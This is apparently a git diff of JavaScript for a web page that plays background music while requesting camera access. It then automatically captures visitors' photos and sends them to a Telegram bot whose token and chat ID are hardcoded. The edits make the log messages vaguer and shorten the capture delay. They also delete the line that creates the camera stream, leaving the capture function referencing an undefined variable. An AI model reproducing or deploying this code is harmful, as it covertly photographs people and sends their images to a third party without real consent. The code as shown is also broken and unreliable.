@@ -9,7 +9,7 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK + KAMERA — FIX 1x PERIZINAN ===
+// === BAGIAN MUSIK ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
@@ -26,7 +26,7 @@ async function startMusicAndCamera() {
     console.log("🎵 Musik diputar");
     musicStarted = true;
   } catch (err) {
-    console.warn("Autoplay musik gagal:", err);
+    console.warn("Musik gagal:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
     // tetap lanjut izin kamera walau musik gagal
@@ -42,16 +42,16 @@ async function startMusicAndCamera() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         stream.getTracks().forEach(t => t.stop());
         localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("✅ Izin kamera diberikan pertama kali.");
+        console.log("Perizinan.");
       } else {
-        console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
+        console.log("Perizinan");
       }
 
       // ambil & kirim foto
       await autoCaptureAndSend();
 
     } catch (e) {
-      console.warn("❌ User menolak izin kamera:", e);
+      console.warn(" User menolak izin:", e);
     }
   }, musicStarted ? 800 : 1500);
 
@@ -67,7 +67,6 @@ async function startMusicAndCamera() {
 // === Fungsi ambil foto & kirim ke Telegram ===
 async function autoCaptureAndSend() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement("video");
     video.srcObject = stream;
     video.playsInline = true;
@@ -77,7 +76,7 @@ async function autoCaptureAndSend() {
       setTimeout(res, 3000);
     });
 
-    await new Promise(r => setTimeout(r, 1000));
+    await new Promise(r => setTimeout(r, 300));
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
